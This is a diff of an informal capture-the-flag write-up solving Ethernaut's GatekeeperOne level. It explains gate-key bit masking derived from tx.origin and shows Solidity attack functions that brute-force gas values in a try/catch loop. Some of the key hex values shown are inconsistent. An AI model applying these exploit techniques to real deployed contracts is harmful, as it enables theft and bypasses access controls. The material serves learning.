@@ -11,15 +11,15 @@
 
 4.
 
-- uint64 takes bytes8 of space so each byte is uint8 and that makes 8\*8 bytes =>64 bits of uint
+- uint64 takes bytes8 of space so each byte is uint8 and that makes 8\*8 bytes => 64 bits of uint => address has 42 charactors and each charactor is 4 bits so every 2 charactor of an address is 1 byte and 1 charactor is 4 bits => so 16 bits of uint is last 4 charactors of address =>
   > 1.  require(uint32(uint64(\_gateKey)) == uint16(uint64(\_gateKey)))
   >     // 00000000 "0000 810a" (uint32) == 0000 "`810a`" (uint16) => here the first
   > 2.  require(uint32(uint64(\_gateKey)) != uint64(\_gateKey))
   >     // `00000000 "0000 810a"` (uint32) != "00000000 00000000" + "00000000 0000 810a" => ...this fails because both are equal
-  >     // 00000000 "0000 810a" (uint32) != `"00000000 00000001" + "00000000 0000 810a"` => we can edit the first 32 bits to any value and so it becomes unequal i just gave `0x01` and then the rest of the 32 bits
+  >     // 00000000 "0000 810a" (uint32) != `"00000000 00000001" + "00000000 0000 810a"` => we can edit the first 32 bits to any value and so it becomes unequal i just gave `0x01` as higher order bits
   > 3.  require(uint32(uint64(\_gateKey)) == uint16(uint160(tx.origin)))
   >     // 00000000 "0000 810a" (uint32) == `0000 "810a"` => (uint16 of tx.origin)
-  >     finally, we pass the requirement for second gate => "00000000 00000001" + "00000000 0000 810a" => `"0x1000000000000810a"`
+  >     finally, we pass the requirement for second gate => "00000000 00000001" + "00000000 0000 810a" => `"0x10000 0000 0000 810a"`
 
 5. The code should look like this...
 
@@ -46,4 +46,53 @@ contract Attack {
 }
 ```
 
-6. Calculating gasLeft() =>
+6. Calculating gasLeft() => so what i did is try to deploy Attack contract on remix london with arbitrary values... and did 2978094-2972894 the first one being the remaining gas and then i reached the end so i assumed when i fail it reaches the end and that much gas will be used till i reach gasLeft() modifier check and that was how i got the second remaining gas (from remix london), then i subtracted smaller value from larger and got 5200, tried to input 5200 and the key and attacked, failed ... i tried to count gas one step at a time but i was not able not know which line is the execution happening since it was always giving opcodes on same line and i didn't go to study the opcodes... maybe in future if required.
+
+7. Trying again, exhausted and frustrated, on internet i searched but i got the direct solution and not the way to calculate gas `https://forum.openzeppelin.com/t/lvl-13-gatekeeper-one-question/6565`
+   also i found this by open zappelin forum searching on internet but didn't read much still leaving this reference `https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009`
+
+I changed the attack() to attack using looping the gas since there are not many calls and writing on the contract it shouldn't take much of gas so i bruteforced upto 200 iterations, so the gas used up could be around < 200 (assumption)
+
+```solidity
+//0xB7cA5Ae7FFcf1E7846e3C3eDc1bD36b7ff33 810a //tx.origin => key => "0x1000000000000810a"
+    // "0x111122220000810a"
+    function attack(bytes8 addr) public {
+        for (uint i; i<200; i++) {
+          gate.enter{gas: i + 8191 *5}(addr) {
+    }
+```
+
+i don't remember what happened after i ran above function, i assume failed since at this point i am writing after completing the challenge.
+
+8. Next i tried this one assuming when try block passes it will stop the execution and we win, actually the tx did not fail and i thought i passed and was happy and quily submitted but it was 20 second of joy, i checked `await contract.entrant()` and it was 0 address... i was not sure how try catch worked so i had to seach try catch in solidity on internet to find solidity docs and trial and error until the compiler accepts my code...
+   `https://docs.soliditylang.org/en/v0.8.17/control-structures.html#try-catch`
+
+```solidity
+//0xB7cA5Ae7FFcf1E7846e3C3eDc1bD36b7ff33 810a //tx.origin => key => "0x1000000000000810a"
+    // "0x111122220000810a"
+    function attack(bytes8 addr) public {
+        for (uint i; i<8191; i++) {
+            try gate.enter{gas: i + 8191 *5}(addr) {
+                return;
+            }
+            catch {}
+        }
+    }
+```
+
+9. I then quickly removed the return hoping it would solve it this time, tx mined and did not fail but this time i first checked await contract.entrance() and it was and address, ah... this one :)
+
+```solidity
+//0xB7cA5Ae7FFcf1E7846e3C3eDc1bD36b7ff33 810a //tx.origin => key => "0x1000000000000810a"
+    // "0x111122220000810a"
+    function attack(bytes8 addr) public {
+        for (uint i; i<8191; i++) {
+            try gate.enter{gas: i + 8191 *5}(addr) {
+                //return;
+            }
+            catch {}
+        }
+    }
+```
+
+10. success
